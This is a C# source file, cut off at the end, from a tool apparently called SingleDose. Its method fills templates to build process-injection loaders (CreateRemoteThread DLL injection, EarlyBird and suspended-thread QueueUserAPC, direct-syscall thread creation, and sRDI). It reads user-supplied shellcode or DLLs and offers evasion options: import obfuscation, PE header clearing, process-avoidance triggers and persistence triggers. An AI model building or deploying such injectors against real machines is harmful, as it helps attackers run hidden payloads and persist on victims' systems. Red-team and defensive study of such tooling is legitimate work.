using System;
using System.IO;
using System.Security.Cryptography;
using System.Text.RegularExpressions;

namespace SingleDose
{
    partial class Program
    {
        /// <summary>
        /// Builds the contents for the .cs file based on the selected technique. Each technique has a "BODY" with several patterns such as {{MODE}} and {{TRIGGER}}, that will be replaced with
        /// appropriate information based on settings/triggers set by the user.
        /// </summary>
        /// <param name="injMode"> The mode selected by the user in Settings Menu</param>
        /// <param name="injTechnique"> The technique selected with the "build" command in Main Menu.</param>
        /// <returns></returns>
        public static bool CSConstructor(string injMode, string injTechnique)
        { 
            if (injMode == "STATIC")
            {
                if (injTechnique == "CreateRemoteThread")
                {
                    string targetProcess = null;
                    string targetDLLPath = null;
                    Console.WriteLine("|   [~] Enter Target Process Name or PID: ");
                    do
                    {
                        Console.Write("|       > ");
                        targetProcess = Console.ReadLine();
                    } while (string.IsNullOrEmpty(targetProcess) && targetProcess.ToLower() != "exit");

                    if (targetProcess.ToLower() == "exit")
                    {
                        return false;
                    }

                    if (targetProcess.EndsWith(".exe"))
                    {
                        targetProcess = targetProcess.TrimEnd('.', 'e', 'x', 'e');
                    }

                    Console.WriteLine("|   [~] Enter Target DLL Absolute Path: ");
                    do
                    {
                        Console.Write("|       > ");
                        targetDLLPath = Console.ReadLine();
                    } while (string.IsNullOrEmpty(targetDLLPath) && targetDLLPath.ToLower() != "exit");

                    if (targetDLLPath.ToLower() == "exit")
                    {
                        return false;
                    }

                    string CSContents = DLL_CRT.BODY;
                    Regex DLLCRTPattern;
                    foreach (var trig in TriggersToUse)
                    {
                        if (trig == "REQUIRETRIGGER")
                        {
                            DLLCRTPattern = new Regex("//{{TRIGGER}}");
                            CSContents = DLLCRTPattern.Replace(CSContents, REQUIRETRIGGER);
                            DLLCRTPattern = new Regex("//{{REQUIREMENTS}}");
                            CSContents = DLLCRTPattern.Replace(CSContents, REQUIREDPROCESSDETAILS);
                        }
                        if (trig == "HIBERNATETRIGGER")
                        {
                            DLLCRTPattern = new Regex("//{{TRIGGER}}");
                            CSContents = DLLCRTPattern.Replace(CSContents, HIBERNATETRIGGER);
                            DLLCRTPattern = new Regex("//{{REQUIREMENTS}}");
                            CSContents = DLLCRTPattern.Replace(CSContents, HIBERNATEPROCESSDETAILS);
                        }
                        if (trig == "AVOIDTRIGGER")
                        {
                            DLLCRTPattern = new Regex("//{{TRIGGER}}");
                            CSContents = DLLCRTPattern.Replace(CSContents, AVOIDTRIGGER);
                            DLLCRTPattern = new Regex("//{{REQUIREMENTS}}");
                            CSContents = DLLCRTPattern.Replace(CSContents, AVOIDPROCESSDETAILS);
                        }
                        if (trig == "PERSISTTRIGGER")
                        {
                            DLLCRTPattern = new Regex("//{{TRIGGER}}");
                            CSContents = DLLCRTPattern.Replace(CSContents, PERSISTTRIGGER);
                            DLLCRTPattern = new Regex("//{{REQUIREMENTS}}");
                            CSContents = DLLCRTPattern.Replace(CSContents, PERSISTPROCESSDETAILS);
                        }
                    }

                    DLLCRTPattern = new Regex("//{{TRIGGER}}");
                    CSContents = DLLCRTPattern.Replace(CSContents, "");

                    DLLCRTPattern = new Regex("//{{MODE}}");
                    CSContents = DLLCRTPattern.Replace(CSContents, DLL_CRT.STATICMODE);
                    DLLCRTPattern = new Regex("\\{\\{0\\}\\}"); //Targetprocess
                    CSContents = DLLCRTPattern.Replace(CSContents, targetProcess);
                    DLLCRTPattern = new Regex("\\{\\{1\\}\\}"); //TargetDLL
                    CSContents = DLLCRTPattern.Replace(CSContents, targetDLLPath);

                    DLLCRTPattern = new Regex("{{NAMESPACE}}");
                    CSContents = DLLCRTPattern.Replace(CSContents, GenRandomString());

                    DLLCRTPattern = new Regex("//{{ARGS}}");
                    CSContents = DLLCRTPattern.Replace(CSContents,"");

                    if (WriteCS(CSContents, injTechnique, Settings.OutputDirectory, false))
                    {
                        return true;
                    }
                    else
                    {
                        return false;
                    }
                    
                }
                else if (injTechnique == "EarlyBird_QueueUserAPC")
                {
                    
                    string spawnProcess;
                    Console.WriteLine("|   [~] Spawn process required. Enter Absolute Path: ");
                    do
                    {
                        Console.Write("|       > ");
                        spawnProcess = Console.ReadLine();
                    } while (string.IsNullOrEmpty(spawnProcess));

                    string shellCodePath;
                    Console.WriteLine("|   [~] Enter path to shellcode: ");
                    do
                    {
                        Console.Write("|       > ");
                        shellCodePath = Console.ReadLine();
                    } while (!File.Exists(shellCodePath));

                    byte[] shellCode = File.ReadAllBytes(shellCodePath);
                    string byteToString = "0x" + ByteArrayToString(shellCode);

                    string CSContents = EB_QUAPC.BODY;
                    Regex QueuePattern;
                    foreach (var trig in TriggersToUse)
                    {
                        if (trig == "REQUIRETRIGGER")
                        {
                            QueuePattern = new Regex("//{{TRIGGER}}");
                            CSContents = QueuePattern.Replace(CSContents, REQUIRETRIGGER);
                            QueuePattern = new Regex("//{{REQUIREMENTS}}");
                            CSContents = QueuePattern.Replace(CSContents, REQUIREDPROCESSDETAILS);
                        }

                        if (trig == "HIBERNATETRIGGER")
                        {
                            QueuePattern = new Regex("//{{TRIGGER}}");
                            CSContents = QueuePattern.Replace(CSContents, HIBERNATETRIGGER);
                            QueuePattern = new Regex("//{{REQUIREMENTS}}");
                            CSContents = QueuePattern.Replace(CSContents, HIBERNATEPROCESSDETAILS);
                        }
                        if (trig == "AVOIDTRIGGER")
                        {
                            QueuePattern = new Regex("//{{TRIGGER}}");
                            CSContents = QueuePattern.Replace(CSContents, AVOIDTRIGGER);
                            QueuePattern = new Regex("//{{REQUIREMENTS}}");
                            CSContents = QueuePattern.Replace(CSContents, AVOIDPROCESSDETAILS);
                        }
                        if (trig == "PERSISTTRIGGER")
                        {
                            QueuePattern = new Regex("//{{TRIGGER}}");
                            CSContents = QueuePattern.Replace(CSContents, PERSISTTRIGGER);
                            QueuePattern = new Regex("//{{REQUIREMENTS}}");
                            CSContents = QueuePattern.Replace(CSContents, PERSISTPROCESSDETAILS);
                        }
                    }

                    //Clear remaining trigger.
                    QueuePattern = new Regex("//{{TRIGGER}}");
                    CSContents = QueuePattern.Replace(CSContents, "");

                    QueuePattern = new Regex("//\\{\\{MODE\\}\\}");
                    CSContents = QueuePattern.Replace(CSContents,EB_QUAPC.STATICMODE);
                    QueuePattern = new Regex("{{SHELLCODE}}");
                    CSContents = QueuePattern.Replace(CSContents,byteToString);
                    QueuePattern = new Regex("{{SPAWN}}");
                    CSContents = QueuePattern.Replace(CSContents, "@\""+spawnProcess+"\"");
                    QueuePattern = new Regex("{{NAMESPACE}}");
                    CSContents = QueuePattern.Replace(CSContents, GenRandomString());
                    QueuePattern = new Regex("//\\{\\{ARGS\\}\\}");
                    CSContents = QueuePattern.Replace(CSContents, "");

                    if (WriteCS(CSContents, injTechnique, Settings.OutputDirectory, false))
                    {
                        return true;
                    }
                    else
                    {
                        return false;
                    }

                }
                else if (injTechnique == "Suspend_QueueUserAPC")//need to do
                {

                    string setPID;
                    Console.WriteLine("|   [~] Enter Target PID: ");
                    do
                    {
                        Console.Write("|       > ");
                        setPID = Console.ReadLine();
                    } while (string.IsNullOrEmpty(setPID));

                    string shellCodePath;
                    Console.WriteLine("|   [~] Enter path to shellcode: ");
                    do
                    {
                        Console.Write("|       > ");
                        shellCodePath = Console.ReadLine();
                    } while (!File.Exists(shellCodePath));

                    byte[] shellCode = File.ReadAllBytes(shellCodePath);
                    string byteToString = "0x" + ByteArrayToString(shellCode);

                    string CSContents = Suspend_QueueUserAPC.BODY;
                    Regex QueuePattern;
                    foreach (var trig in TriggersToUse)
                    {
                        if (trig == "REQUIRETRIGGER")
                        {
                            QueuePattern = new Regex("//{{TRIGGER}}");
                            CSContents = QueuePattern.Replace(CSContents, REQUIRETRIGGER);
                            QueuePattern = new Regex("//{{REQUIREMENTS}}");
                            CSContents = QueuePattern.Replace(CSContents, REQUIREDPROCESSDETAILS);
                        }

                        if (trig == "HIBERNATETRIGGER")
                        {
                            QueuePattern = new Regex("//{{TRIGGER}}");
                            CSContents = QueuePattern.Replace(CSContents, HIBERNATETRIGGER);
                            QueuePattern = new Regex("//{{REQUIREMENTS}}");
                            CSContents = QueuePattern.Replace(CSContents, HIBERNATEPROCESSDETAILS);
                        }
                        if (trig == "AVOIDTRIGGER")
                        {
                            QueuePattern = new Regex("//{{TRIGGER}}");
                            CSContents = QueuePattern.Replace(CSContents, AVOIDTRIGGER);
                            QueuePattern = new Regex("//{{REQUIREMENTS}}");
                            CSContents = QueuePattern.Replace(CSContents, AVOIDPROCESSDETAILS);
                        }
                        if (trig == "PERSISTTRIGGER")
                        {
                            QueuePattern = new Regex("//{{TRIGGER}}");
                            CSContents = QueuePattern.Replace(CSContents, PERSISTTRIGGER);
                            QueuePattern = new Regex("//{{REQUIREMENTS}}");
                            CSContents = QueuePattern.Replace(CSContents, PERSISTPROCESSDETAILS);
                        }
                    }

                    //Clear remaining trigger.
                    QueuePattern = new Regex("//{{TRIGGER}}");
                    CSContents = QueuePattern.Replace(CSContents, "");

                    QueuePattern = new Regex("//\\{\\{MODE\\}\\}");
                    CSContents = QueuePattern.Replace(CSContents, Suspend_QueueUserAPC.STATICMODE);
                    QueuePattern = new Regex("{{SHELLCODE}}");
                    CSContents = QueuePattern.Replace(CSContents, byteToString);
                    QueuePattern = new Regex("{{PROCESSID}}");
                    CSContents = QueuePattern.Replace(CSContents, setPID);
                    QueuePattern = new Regex("{{NAMESPACE}}");
                    CSContents = QueuePattern.Replace(CSContents, GenRandomString());
                    QueuePattern = new Regex("\\{\\{ARGS\\}\\}");
                    CSContents = QueuePattern.Replace(CSContents, "");

                    if (WriteCS(CSContents, injTechnique, Settings.OutputDirectory, false))
                    {
                        return true;
                    }
                    else
                    {
                        return false;
                    }

                }
                else if (injTechnique == "Syscall_CreateThread")
                {
                    //{{0}} shellcode "{0xfc,0x48,0x83}"
                    string shellCodePath;
                    Console.WriteLine("|   [~] Enter path to shellcode: ");
                    do
                    {
                        Console.Write("|       > ");
                        shellCodePath = Console.ReadLine();
                    } while (!File.Exists(shellCodePath));

                    byte[] shellCode = File.ReadAllBytes(shellCodePath);
                    string byteToString = "0x" + ByteArrayToString(shellCode);

                    //string CSContents = SC_SYSCALL_HEADER + SC_SYSCALL_STATIC + SC_SYSCALL_END;
                    string CSContents = SYSCALL_CT.BODY;

                    Regex syscallPattern;
                    foreach (var trig in TriggersToUse)
                    {
                        if (trig == "REQUIRETRIGGER")
                        {
                            syscallPattern = new Regex("//{{TRIGGER}}");
                            CSContents = syscallPattern.Replace(CSContents, REQUIRETRIGGER);
                            syscallPattern = new Regex("//{{REQUIREMENTS}}");
                            CSContents = syscallPattern.Replace(CSContents, REQUIREDPROCESSDETAILS);
                        }

                        if (trig == "HIBERNATETRIGGER")
                        {
                            syscallPattern = new Regex("//{{TRIGGER}}");
                            CSContents = syscallPattern.Replace(CSContents, HIBERNATETRIGGER);
                            syscallPattern = new Regex("//{{REQUIREMENTS}}");
                            CSContents = syscallPattern.Replace(CSContents, HIBERNATEPROCESSDETAILS);
                        }
                        if (trig == "AVOIDTRIGGER")
                        {
                            syscallPattern = new Regex("//{{TRIGGER}}");
                            CSContents = syscallPattern.Replace(CSContents, AVOIDTRIGGER);
                            syscallPattern = new Regex("//{{REQUIREMENTS}}");
                            CSContents = syscallPattern.Replace(CSContents, AVOIDPROCESSDETAILS);
                        }
                        if (trig == "PERSISTTRIGGER")
                        {
                            syscallPattern = new Regex("//{{TRIGGER}}");
                            CSContents = syscallPattern.Replace(CSContents, PERSISTTRIGGER);
                            syscallPattern = new Regex("//{{REQUIREMENTS}}");
                            CSContents = syscallPattern.Replace(CSContents, PERSISTPROCESSDETAILS);
                        }
                    }

                    //Clear remaining trigger.
                    syscallPattern = new Regex("//{{TRIGGER}}");
                    CSContents = syscallPattern.Replace(CSContents, "");

                    syscallPattern = new Regex("\\{\\{MODE\\}\\}");
                    CSContents = syscallPattern.Replace(CSContents, SYSCALL_CT.STATIC);
                    syscallPattern = new Regex("\\{\\{SHELLCODE\\}\\}");
                    CSContents = syscallPattern.Replace(CSContents, byteToString);
                    syscallPattern = new Regex("{{NAMESPACE}}");
                    CSContents = syscallPattern.Replace(CSContents, GenRandomString());
                    syscallPattern = new Regex("//\\{\\{ARGS\\}\\}");
                    CSContents = syscallPattern.Replace(CSContents, "");
                    if (WriteCS(CSContents, injTechnique, Settings.OutputDirectory,true)) //unsafe code is used for syscalls
                    {
                        return true;
                    }
                    else
                    {
                        return false;
                    }
                }
                else if (injTechnique == "SRDI")
                {
                    SRDIClass srdiClass = new SRDIClass();

                    string dllPath;
                    Console.WriteLine("|   [~] Please enter absolute path to DLL. This can be on this host or the target:");
                    do
                    {
                        Console.Write("|       > ");
                        dllPath = Console.ReadLine();
                    } while (!dllPath.Contains(":\\"));

                    if (File.Exists(dllPath))
                    {
                        Console.WriteLine("|   [*] Converting {0} byte array.", dllPath);
                        srdiClass.DLLData = File.ReadAllBytes(dllPath);
                    }
                    else
                    {
                        srdiClass.DLLFilepath = dllPath;
                    }

                    string functionName;
                    Console.WriteLine("|\n|   [OPTIONAL] Enter the name of an exported function to call after DLLMain:");
                    Console.Write("|       > ");
                    functionName = Console.ReadLine();
                    if ((functionName != null) && (functionName != ""))
                    {
                        srdiClass.HashFunction = functionName;
                    }

                    string userData;
                    Console.WriteLine("|   [OPTIONAL] Enter any additional data to pass to call after DLLMain:");
                    Console.Write("|       > ");
                    userData = Console.ReadLine();

                    if ((userData != null) && (userData != ""))
                    {
                        srdiClass.AdditionalData = userData;
                    }

                    string obfuscateImports;
                    Console.WriteLine("|   [OPTIONAL] Would you like to Obfuscate imports? (Y/N)");

                    do
                    {
                        Console.Write("|       > ");
                        obfuscateImports = Console.ReadLine();
                    } while (obfuscateImports.ToUpper() != "Y" && obfuscateImports.ToUpper() != "N" && obfuscateImports != "");

                    if (obfuscateImports.ToUpper() == "Y")
                    {
                        srdiClass.ObfuscateImports = true;
                    }
                    else if (obfuscateImports.ToUpper() == "N")
                    {
                        srdiClass.ObfuscateImports = false;
                    }

                    if (srdiClass.ObfuscateImports)
                    {
                        Console.WriteLine("|   [OPTIONAL] Enter seconds to pause between loading imports? (Default: 0)");
                        string importDelay;
                        int parsedInt;
                        do
                        {
                            Console.Write("|       > ");
                            importDelay = Console.ReadLine();

                        } while (!int.TryParse(importDelay, out parsedInt) && importDelay != "");

                        if (importDelay != "0")
                        {
                            srdiClass.ImportDelay = parsedInt;
                        }
                        else
                        {
                            srdiClass.ImportDelay = 0;
                        }

                    }
                    string clearHeader;
                    Console.WriteLine("|   [OPTIONAL] Would you like to clear the PE header on load? (Y/N)");
                    do
                    {
                        Console.Write("|       > ");
                        clearHeader = Console.ReadLine();
                    } while (clearHeader.ToUpper() != "Y" && clearHeader.ToUpper() != "N" && clearHeader != "");

                    if (clearHeader.ToUpper() == "Y")
                    {
                        srdiClass.ClearHeader = true;
                    } 
                    else if (clearHeader.ToUpper() == "N")
                    {
                        srdiClass.ClearHeader = false;
                    }

                    string CSContents = sRDI.BODY;

                    Regex replacePattern;
                    foreach (var trig in TriggersToUse)
                    {
                        if (trig == "REQUIRETRIGGER")
                        {
                            replacePattern = new Regex("//{{TRIGGER}}");
                            CSContents = replacePattern.Replace(CSContents, REQUIRETRIGGER);
                            replacePattern = new Regex("//{{REQUIREMENTS}}");
                            CSContents = replacePattern.Replace(CSContents, REQUIREDPROCESSDETAILS);
                        }
                        if (trig == "HIBERNATETRIGGER")
                        {
                            replacePattern = new Regex("//{{TRIGGER}}");
                            CSContents = replacePattern.Replace(CSContents, HIBERNATETRIGGER);
                            replacePattern = new Regex("//{{REQUIREMENTS}}");
                            CSContents = replacePattern.Replace(CSContents, HIBERNATEPROCESSDETAILS);
                        }
                        if (trig == "AVOIDTRIGGER")
                        {
                            replacePattern = new Regex("//{{TRIGGER}}");
                            CSContents = replacePattern.Replace(CSContents, AVOIDTRIGGER);
                            replacePattern = new Regex("//{{REQUIREMENTS}}");
                            CSContents = replacePattern.Replace(CSContents, AVOIDPROCESSDETAILS);
                        }
                        if (trig == "PERSISTTRIGGER")
                        {
                            replacePattern = new Regex("//{{TRIGGER}}");
                            CSContents = replacePattern.Replace(CSContents, PERSISTTRIGGER);
                            replacePattern = new Regex("//{{REQUIREMENTS}}");
                            CSContents = replacePattern.Replace(CSContents, PERSISTPROCESSDETAILS);
                        }
                    }

                    //Clear remaining trigger.
                    replacePattern = new Regex("//{{TRIGGER}}");
                    CSContents = replacePattern.Replace(CSContents, "");

                    replacePattern = new Regex("\\{\\{MODE\\}\\}");
                    CSContents = replacePattern.Replace(CSContents, sRDI.STATICMODE);
                    replacePattern = new Regex("\\{\\{DLLCONTENTS\\}\\}");
                    if (srdiClass.DLLFilepath != null)
                    {
                        CSContents = replacePattern.Replace(CSContents, sRDI.READFILE);
                        replacePattern = new Regex("\\{\\{FILEPATH\\}\\}");
                        CSContents = replacePattern.Replace(CSContents, srdiClass.DLLFilepath);
                    } 
                    else if (srdiClass.DLLData.Length > 0)
                    {
                        CSContents = replacePattern.Replace(CSContents, sRDI.BYTES);
                        string byteToString = "0x";
                        byteToString = byteToString + ByteArrayToString(srdiClass.DLLData);
                        replacePattern = new Regex("\\{\\{BYTES\\}\\}");
                        CSContents = replacePattern.Replace(CSContents, byteToString);
                    }

                    replacePattern = new Regex("\\{\\{FUNCTIONNAME\\}\\}");
                    if (srdiClass.HashFunction != null)
                    {
                        CSContents = replacePattern.Replace(CSContents, srdiClass.HashFunction);
                    }
                    else
                    {
                        CSContents = replacePattern.Replace(CSContents, "0");
                    }
                    replacePattern = new Regex("\\{\\{USERDATA\\}\\}");
                    if (srdiClass.AdditionalData != null)
                    {
                        CSContents = replacePattern.Replace(CSContents, srdiClass.AdditionalData);
                    }
                    else
                    {
                     
                        CSContents = replacePattern.Replace(CSContents, "");
                    }

                    replacePattern = new Regex("\\{\\{OBFUSCATE\\}\\}");
                    if (srdiClass.ObfuscateImports)
                    {
                        CSContents = replacePattern.Replace(CSContents, "true");
                    }
                    else
                    {
                        CSContents = replacePattern.Replace(CSContents, "false");
                    }

                    replacePattern = new Regex("\\{\\{IMPORTDELAY\\}\\}");
                    CSContents = replacePattern.Replace(CSContents, srdiClass.ImportDelay.ToString());

                    replacePattern = new Regex("\\{\\{CLEARHEADER\\}\\}");
                    if (srdiClass.ClearHeader)
                    {
                        CSContents = replacePattern.Replace(CSContents, "true");
                    }
                    else
                    {
                        CSContents = replacePattern.Replace(CSContents, "false");
                    }

                    replacePattern = new Regex("{{NAMESPACE}}");
                    CSContents = replacePattern.Replace(CSContents, GenRandomString());

                    replacePattern = new Regex("//\\{\\{ARGS\\}\\}");
                    CSContents = replacePattern.Replace(CSContents,"");

                    if (WriteCS(CSContents, injTechnique, Settings.OutputDirectory, true))
                    {
                        return true;
                    }
                    else
                    {
                        return false;
                    }
                }
            }
            else if (injMode == "DYNAMIC")
            {
                if (injTechnique == "CreateRemoteThread")
                {
                    string CSContents = DLL_CRT.BODY;
                    Regex DLLCRTPattern;
                    foreach (var trig in TriggersToUse)
                    {
                        if (trig == "REQUIRETRIGGER")
                        {
                            DLLCRTPattern = new Regex("//{{TRIGGER}}");
                            CSContents = DLLCRTPattern.Replace(CSContents, REQUIRETRIGGER);
                            DLLCRTPattern = new Regex("//{{REQUIREMENTS}}");
                            CSContents = DLLCRTPattern.Replace(CSContents, REQUIREDPROCESSDETAILS);
                        }
                        if (trig == "HIBERNATETRIGGER")
                        {
                            DLLCRTPattern = new Regex("//{{TRIGGER}}");
                            CSContents = DLLCRTPattern.Replace(CSContents, HIBERNATETRIGGER);
                            DLLCRTPattern = new Regex("//{{REQUIREMENTS}}");
                            CSContents = DLLCRTPattern.Replace(CSContents, HIBERNATEPROCESSDETAILS);
                        }
                        if (trig == "AVOIDTRIGGER")
                        {
                            DLLCRTPattern = new Regex("//{{TRIGGER}}");
                            CSContents = DLLCRTPattern.Replace(CSContents, AVOIDTRIGGER);
                            DLLCRTPattern = new Regex("//{{REQUIREMENTS}}");
                            CSContents = DLLCRTPattern.Replace(CSContents, AVOIDPROCESSDETAILS);
                        }
                        if (trig == "PERSISTTRIGGER")
                        {
                            DLLCRTPattern = new Regex("//{{TRIGGER}}");
                            CSContents = DLLCRTPattern.Replace(CSContents, PERSISTTRIGGER);
                            DLLCRTPattern = new Regex("//{{REQUIREMENTS}}");
                            CSContents = DLLCRTPattern.Replace(CSContents, PERSISTPROCESSDETAILS);
                        }
                    }

                    DLLCRTPattern = new Regex("//{{TRIGGER}}");
                    CSContents = DLLCRTPattern.Replace(CSContents, "");

                    DLLCRTPattern = new Regex("//{{MODE}}");
                    CSContents = DLLCRTPattern.Replace(CSContents, DLL_CRT.DYNAMICMODE);
                    DLLCRTPattern = new Regex("{{NAMESPACE}}");
                    CSContents = DLLCRTPattern.Replace(CSContents, GenRandomString());
                    DLLCRTPattern = new Regex("//\\{\\{ARGS\\}\\}");
                    CSContents = DLLCRTPattern.Replace(CSContents, DLL_CRT.DYNAMICARGPARSE);

                    if (WriteCS(CSContents, injTechnique, Settings.OutputDirectory,false))
                    {
                        return true;
                    }
                    else
                    {
                        return false;
                    }
                }
                else if (injTechnique == "EarlyBird_QueueUserAPC")
                {
                    string CSContents = EB_QUAPC.BODY;
                    Regex QueuePattern;
                    foreach (var trig in TriggersToUse) {
                        if (trig == "REQUIRETRIGGER")
                        {
                            QueuePattern = new Regex("//{{TRIGGER}}");
                            CSContents = QueuePattern.Replace(CSContents, REQUIRETRIGGER);
                            QueuePattern = new Regex("//{{REQUIREMENTS}}");
                            CSContents = QueuePattern.Replace(CSContents, REQUIREDPROCESSDETAILS);
                        }
                        if (trig == "HIBERNATETRIGGER")
                        {
                            QueuePattern = new Regex("//{{TRIGGER}}");
                            CSContents = QueuePattern.Replace(CSContents, HIBERNATETRIGGER);
                            QueuePattern = new Regex("//{{REQUIREMENTS}}");
                            CSContents = QueuePattern.Replace(CSContents, HIBERNATEPROCESSDETAILS);
                        }
                        if (trig == "AVOIDTRIGGER")
                        {
                            QueuePattern = new Regex("//{{TRIGGER}}");
                            CSContents = QueuePattern.Replace(CSContents, AVOIDTRIGGER);
                            QueuePattern = new Regex("//{{REQUIREMENTS}}");
                            CSContents = QueuePattern.Replace(CSContents, AVOIDPROCESSDETAILS);
                        }
                        if (trig == "PERSISTTRIGGER")
                        {
                            QueuePattern = new Regex("//{{TRIGGER}}");
                            CSContents = QueuePattern.Replace(CSContents, PERSISTTRIGGER);
                            QueuePattern = new Regex("//{{REQUIREMENTS}}");
                            CSContents = QueuePattern.Replace(CSContents, PERSISTPROCESSDETAILS);
                        }
                    }

                    //Clear remaining trigger.
                    QueuePattern = new Regex("//{{TRIGGER}}");
                    CSContents = QueuePattern.Replace(CSContents, "");

                    QueuePattern = new Regex("//{{MODE}}");
                    CSContents = QueuePattern.Replace(CSContents, EB_QUAPC.DYNAMICMODE);
                    QueuePattern = new Regex("{{SPAWN}}");
                    CSContents = QueuePattern.Replace(CSContents, "parsedArgs.Spawn");
                    QueuePattern = new Regex("{{NAMESPACE}}");
                    CSContents = QueuePattern.Replace(CSContents, GenRandomString());
                    QueuePattern = new Regex("//\\{\\{ARGS\\}\\}");
                    CSContents = QueuePattern.Replace(CSContents, EB_QUAPC.DYNAMICARGPARSE);

                    if (WriteCS(CSContents, injTechnique, Settings.OutputDirectory, false))
                    {
                        return true;
                    }
                    else
                    {
                        return false;
                    }
                }
                else if (injTechnique == "Suspend_QueueUserAPC")
                {
                    string CSContents = Suspend_QueueUserAPC.BODY;
                    Regex QueuePattern;
                    foreach (var trig in TriggersToUse)
                    {
                        if (trig == "REQUIRETRIGGER")
                        {
                            QueuePattern = new Regex("//{{TRIGGER}}");
                            CSContents = QueuePattern.Replace(CSContents, REQUIRETRIGGER);
                            QueuePattern = new Regex("//{{REQUIREMENTS}}");
                            CSContents = QueuePattern.Replace(CSContents, REQUIREDPROCESSDETAILS);
                        }
                        if (trig == "HIBERNATETRIGGER")
                        {
                            QueuePattern = new Regex("//{{TRIGGER}}");
                            CSContents = QueuePattern.Replace(CSContents, HIBERNATETRIGGER);
                            QueuePattern = new Regex("//{{REQUIREMENTS}}");
                            CSContents = QueuePattern.Replace(CSContents, HIBERNATEPROCESSDETAILS);
                        }
                        if (trig == "AVOIDTRIGGER")
                        {
                            QueuePattern = new Regex("//{{TRIGGER}}");
                            CSContents = QueuePattern.Replace(CSContents, AVOIDTRIGGER);
                            QueuePattern = new Regex("//{{REQUIREMENTS}}");
                            CSContents = QueuePattern.Replace(CSContents, AVOIDPROCESSDETAILS);
                        }
                        if (trig == "PERSISTTRIGGER")
                        {
                            QueuePattern = new Regex("//{{TRIGGER}}");
                            CSContents = QueuePattern.Replace(CSContents, PERSISTTRIGGER);
                            QueuePattern = new Regex("//{{REQUIREMENTS}}");
                            CSContents = QueuePattern.Replace(CSContents, PERSISTPROCESSDETAILS);
                        }
                    }

                    //Clear remaining trigger.
                    QueuePattern = new Regex("//{{TRIGGER}}");
                    CSContents = QueuePattern.Replace(CSContents, "");

                    QueuePattern = new Regex("//{{MODE}}");
                    CSContents = QueuePattern.Replace(CSContents, Suspend_QueueUserAPC.DYNAMICMODE);

                    QueuePattern = new Regex("{{NAMESPACE}}");
                    CSContents = QueuePattern.Replace(CSContents, GenRandomString());

                    QueuePattern = new Regex("{{ARGS}}");
                    CSContents = QueuePattern.Replace(CSContents, Suspend_QueueUserAPC.DYNAMICARGPARSE);

                    if (WriteCS(CSContents, injTechnique, Settings.OutputDirectory, false))
                    {
                        return true;
                    }
                    else
                    {
                        return false;
                    }
                }
                else if (injTechnique == "Syscall_CreateThread")
                {

                    string CSContents = SYSCALL_CT.BODY;
                    Regex syscallPattern;
                    foreach (var trig in TriggersToUse)
                    {
                        if (trig == "REQUIRETRIGGER")
                        {
                            syscallPattern = new Regex("//{{TRIGGER}}");
                            CSContents = syscallPattern.Replace(CSContents, REQUIRETRIGGER);
                            syscallPattern = new Regex("//{{REQUIREMENTS}}");
                            CSContents = syscallPattern.Replace(CSContents, REQUIREDPROCESSDETAILS);
                        }
                        if (trig == "HIBERNATETRIGGER")
                        {
                            syscallPattern = new Regex("//{{TRIGGER}}");
                            CSContents = syscallPattern.Replace(CSContents, HIBERNATETRIGGER);
                            syscallPattern = new Regex("//{{REQUIREMENTS}}");
                            CSContents = syscallPattern.Replace(CSContents, HIBERNATEPROCESSDETAILS);
                        }
                        if (trig == "AVOIDTRIGGER")
                        {
                            syscallPattern = new Regex("//{{TRIGGER}}");
                            CSContents = syscallPattern.Replace(CSContents, AVOIDTRIGGER);
                            syscallPattern = new Regex("//{{REQUIREMENTS}}");
                            CSContents = syscallPattern.Replace(CSContents, AVOIDPROCESSDETAILS);
                        }
                        if (trig == "PERSISTTRIGGER")
                        {
                            syscallPattern = new Regex("//{{TRIGGER}}");
                            CSContents = syscallPattern.Replace(CSContents, PERSISTTRIGGER);
                            syscallPattern = new Regex("//{{REQUIREMENTS}}");
                            CSContents = syscallPattern.Replace(CSContents, PERSISTPROCESSDETAILS);
                        }
                    }

                    //Clear remaining trigger.
                    syscallPattern = new Regex("//{{TRIGGER}}");
                    CSContents = syscallPattern.Replace(CSContents, "");

                    syscallPattern = new Regex("\\{\\{MODE\\}\\}");
                    CSContents = syscallPattern.Replace(CSContents, SYSCALL_CT.DYNAMIC);

                    syscallPattern = new Regex("{{NAMESPACE}}");
                    CSContents = syscallPattern.Replace(CSContents, GenRandomString());

                    syscallPattern = new Regex("//\\{\\{ARGS\\}\\}");
                    CSContents = syscallPattern.Replace(CSContents, SYSCALL_CT.DYNAMIC_ARGPARSE);

                    if (WriteCS(CSContents, injTechnique, Settings.OutputDirectory, true))
                    {
                        return true;
                    }
                    else
                    {
                        return false;
                    }
                }
                else if (injTechnique == "SRDI")
                {
                    string CSContents = sRDI.BODY;
                    Regex replacePattern;
                    foreach (var trig in TriggersToUse)
                    {
                        if (trig == "REQUIRETRIGGER")
                        {
                            replacePattern = new Regex("//{{TRIGGER}}");
                            CSContents = replacePattern.Replace(CSContents, REQUIRETRIGGER);
                            replacePattern = new Regex("//{{REQUIREMENTS}}");
                            CSContents = replacePattern.Replace(CSContents, REQUIREDPROCESSDETAILS);
                        }
                        if (trig == "HIBERNATETRIGGER")
                        {
                            replacePattern = new Regex("//{{TRIGGER}}");
                            CSContents = replacePattern.Replace(CSContents, HIBERNATETRIGGER);
                            replacePattern = new Regex("//{{REQUIREMENTS}}");
                            CSContents = replacePattern.Replace(CSContents, HIBERNATEPROCESSDETAILS);
                        }
                        if (trig == "AVOIDTRIGGER")
                        {
                            replacePattern = new Regex("//{{TRIGGER}}");
                            CSContents = replacePattern.Replace(CSContents, AVOIDTRIGGER);
                            replacePattern = new Regex("//{{REQUIREMENTS}}");
                            CSContents = replacePattern.Replace(CSContents, AVOIDPROCESSDETAILS);
                        }
                        if (trig == "PERSISTTRIGGER")
                        {
                            replacePattern = new Regex("//{{TRIGGER}}");
                            CSContents = replacePattern.Replace(CSContents, PERSISTTRIGGER);
                            replacePattern = new Regex("//{{REQUIREMENTS}}");
                            CSContents = replacePattern.Replace(CSContents, PERSISTPROCESSDETAILS);
                        }
                    }

                    //Clear remaining trigger.
                    replacePattern = new Regex("//{{TRIGGER}}");
                    CSContents = replacePattern.Replace(CSContents, "");

                    replacePattern = new Regex("\\{\\{MODE\\}\\}");
                    CSContents = replacePattern.Replace(CSContents, sRDI.DYNAMICMODE);
                    replacePattern = new Regex("{{NAMESPACE}}");
                    CSContents = replacePattern.Replace(CSContents, GenRandomString());
                    replacePattern = new Regex("//\\{\\{ARGS\\}\\}");
                    CSContents = replacePattern.Replace(CSContents, sRDI.DYNAMICARGS);

                    if (WriteCS(CSContents, injTechnique, Settings.OutputDirectory, true))
                    {
                        return true;
                    }
                    else
                    {
